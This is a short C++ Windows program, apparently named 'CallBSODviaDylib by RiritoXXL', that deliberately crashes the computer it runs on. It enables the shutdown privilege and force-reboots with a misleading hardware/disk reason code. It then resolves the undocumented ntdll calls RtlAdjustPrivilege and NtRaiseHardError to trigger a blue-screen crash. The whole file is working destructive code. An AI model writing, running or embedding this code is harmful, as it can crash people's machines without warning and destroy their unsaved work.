#include "includes.hpp"

// 
int main()
{
	SetConsoleTitleA("CallBSODviaDylib by RiritoXXL");
	BOOLEAN bl;
	DWORD response;
	// If PC Is Running, it shall be normal used!!!
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
	auto RtlAdjustPrivilege = GetNTDLL().get_function<intptr_t(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)>("RtlAdjustPrivilege");
	if (!RtlAdjustPrivilege) {
		printf("Not Worked or Failed to Found Function");
		ExitProcess(122);
	}
	auto NtRaiseHardError = GetNTDLL().get_function<intptr_t(DWORD, ULONG, ULONG, PULONG, ULONG, PULONG)>("NtRaiseHardError");
	if (!NtRaiseHardError) {
		printf("Not Worked or Failed to Found Function");
		ExitProcess(554);
	}
	Sleep(5000);
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);
	ExitProcess(12);
	return 0;
}
